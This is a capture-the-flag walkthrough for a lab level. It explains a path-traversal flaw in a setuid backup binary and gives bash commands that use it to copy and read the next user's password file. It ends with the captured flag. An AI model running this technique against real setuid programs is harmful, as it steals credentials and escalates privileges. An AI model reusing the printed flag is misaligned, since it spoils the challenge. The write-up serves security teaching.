# Level 08 Walkthrough

## Vulnerability

**Path Traversal in Backup Utility**

The `level08` binary is a setuid program that backs up a file to a `./backups/` directory.

The vulnerability is in how it constructs the destination path:
```c
strcpy(dest_path, "./backups/");
strcat(dest_path, argv[1]);  // No sanitization!
```

When you provide an **absolute path** like `/home/users/level09/.pass`, the destination becomes:
```
./backups//home/users/level09/.pass
```

The double slash `//` is treated as a single `/` by the filesystem, so this resolves to:
```
./backups/home/users/level09/.pass
```

The binary doesn't create the directory structure - it expects it to exist. We can exploit this by:
1. Creating the directory structure in a writable location (`/tmp`)
2. Running the binary from there
3. The binary (running as level09) can read `/home/users/level09/.pass`
4. It writes the copy to our controlled directory where we can read it

## Exploit

```bash
# Create the directory structure (only the path, not .log file)
mkdir -p /tmp/my_exploit/backups/home/users/level09

# Go to our exploit directory
cd /tmp/my_exploit

# Run the vulnerable binary with the absolute path to the password file
/home/users/level08/level08 /home/users/level09/.pass

# Read the backed-up password
cat backups/home/users/level09/.pass
```

**Note:** The binary may attempt to write to `./backups/.log` for logging, but it doesn't exit if this fails, so we don't need to create it.

## Flag
`fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`
